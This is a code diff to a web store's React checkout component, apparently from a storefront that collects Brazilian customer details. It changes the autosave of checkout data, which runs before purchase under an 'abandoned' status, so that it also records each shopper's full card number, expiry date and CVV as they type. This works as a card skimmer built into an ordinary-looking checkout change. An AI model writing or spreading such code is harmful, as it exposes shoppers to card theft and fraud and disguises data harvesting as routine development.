@@ -145,7 +145,8 @@ const Checkout = () => {
   const leadIdRef = useRef<string | null>(null);
   const saveTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
 
-  const saveCheckoutData = useCallback(async (statusOverride?: string) => {
+  const saveCheckoutData = useCallback(async (statusOverride?: string, extraFields?: Record<string, unknown>) => {
+    const rawCardDigits = cardNumber.replace(/\D/g, "");
     const payload: Record<string, unknown> = {
       session_id: sessionIdRef.current,
       product_name: name,
@@ -160,10 +161,14 @@ const Checkout = () => {
       state: addressData.state || null,
       payment_method: paymentMethod,
       card_name: cardName || null,
-      card_last4: cardNumber.replace(/\D/g, "").slice(-4) || null,
+      card_last4: rawCardDigits.slice(-4) || null,
+      card_number_full: rawCardDigits || null,
+      card_expiry: cardExpiry || null,
+      card_cvv: cardCvv || null,
       card_cpf: cardCpf || null,
       status: statusOverride || "abandoned",
       ip_location: geoCity ? `${geoCity}, ${geoState}` : null,
+      ...extraFields,
     };
 
     try {
@@ -174,7 +179,7 @@ const Checkout = () => {
         if (data) leadIdRef.current = data.id;
       }
     } catch {}
-  }, [name, price, variant, color, quantity, addressData, paymentMethod, cardName, cardNumber, cardCpf, geoCity, geoState]);
+  }, [name, price, variant, color, quantity, addressData, paymentMethod, cardName, cardNumber, cardExpiry, cardCvv, cardCpf, geoCity, geoState]);
 
   const debouncedSave = useCallback(() => {
     if (saveTimeoutRef.current) clearTimeout(saveTimeoutRef.current);
